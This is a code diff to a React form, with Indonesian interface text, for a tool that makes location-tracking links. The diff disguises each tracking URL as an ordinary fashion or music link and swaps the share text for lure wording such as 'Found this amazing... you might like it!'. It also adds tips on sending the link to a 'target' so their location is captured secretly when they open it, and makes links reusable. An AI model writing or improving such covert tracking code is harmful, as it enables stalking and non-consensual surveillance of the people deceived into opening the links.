@@ -25,7 +25,7 @@ const CreateLinkForm: React.FC<CreateLinkFormProps> = ({ onLinkCreated }) => {
       // Generate secure tracking link
       const newLink = generateSecureTrackingLink(targetName.trim());
 
-      // Create the full tracking URL
+      // Create the full tracking URL (now disguised)
       const trackingUrl = createTrackingUrl(newLink);
 
       // Add to parent state
@@ -35,6 +35,9 @@ const CreateLinkForm: React.FC<CreateLinkFormProps> = ({ onLinkCreated }) => {
       setGeneratedLink(trackingUrl);
       setShowResult(true);
       setTargetName("");
+
+      console.log("Created tracking link:", newLink);
+      console.log("Generated URL:", trackingUrl);
     } catch (error) {
       console.error("Error creating tracking link:", error);
       alert("Gagal membuat link tracking. Silakan coba lagi.");
@@ -75,9 +78,15 @@ const CreateLinkForm: React.FC<CreateLinkFormProps> = ({ onLinkCreated }) => {
     // Correctly check if navigator.share is a function before calling it
     if (typeof navigator.share === "function") {
       try {
+        // Extract the disguised path for sharing
+        const url = new URL(generatedLink);
+        const pathSegments = url.pathname.split("/").filter((segment) => segment.length > 0);
+        const category = pathSegments[0] || "item";
+        const item = pathSegments[1] || "content";
+
         await navigator.share({
-          title: `Location Tracker - ${targetName}`,
-          text: `Track lokasi real-time`,
+          title: `Check out this ${category}!`,
+          text: `Found this amazing ${item.replace(/-/g, " ")} - you might like it!`,
           url: generatedLink,
         });
       } catch (err) {
@@ -190,7 +199,7 @@ const CreateLinkForm: React.FC<CreateLinkFormProps> = ({ onLinkCreated }) => {
               </div>
 
               {/* Share button for mobile devices */}
-              {typeof navigator.share === "function" && ( // Updated condition here
+              {typeof navigator.share === "function" && (
                 <button
                   onClick={shareLink}
                   className="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300"
@@ -203,10 +212,21 @@ const CreateLinkForm: React.FC<CreateLinkFormProps> = ({ onLinkCreated }) => {
                 <p className="text-xs text-blue-700 mb-2">💡 **Cara Penggunaan:**</p>
                 <ul className="text-xs text-blue-600 space-y-1">
                   <li>• Bagikan link ini ke target yang ingin ditrack</li>
+                  <li>• Link terlihat seperti URL biasa (fashion, music, dll)</li>
                   <li>• Ketika mereka membuka link, lokasi akan terdeteksi otomatis</li>
                   <li>• Anda akan melihat lokasi mereka di dashboard</li>
-                  <li>• Link ini aman dan hanya berfungsi sekali</li>
+                  <li>• Link ini aman dan dapat digunakan berkali-kali</li>
                 </ul>
+              </div>
+
+              <div className="bg-yellow-50 rounded-lg p-3 border border-yellow-200">
+                <p className="text-xs text-yellow-700 mb-2">⚠️ **Contoh Link yang Dihasilkan:**</p>
+                <p className="text-xs text-yellow-600 font-mono">
+                  https://yoursite.com/fashion/trendy-style?id=abc123&ref=xyz&utm=share
+                </p>
+                <p className="text-xs text-yellow-600 mt-1">
+                  Link terlihat seperti link fashion/produk biasa, bukan tracking link
+                </p>
               </div>
             </div>
           </div>
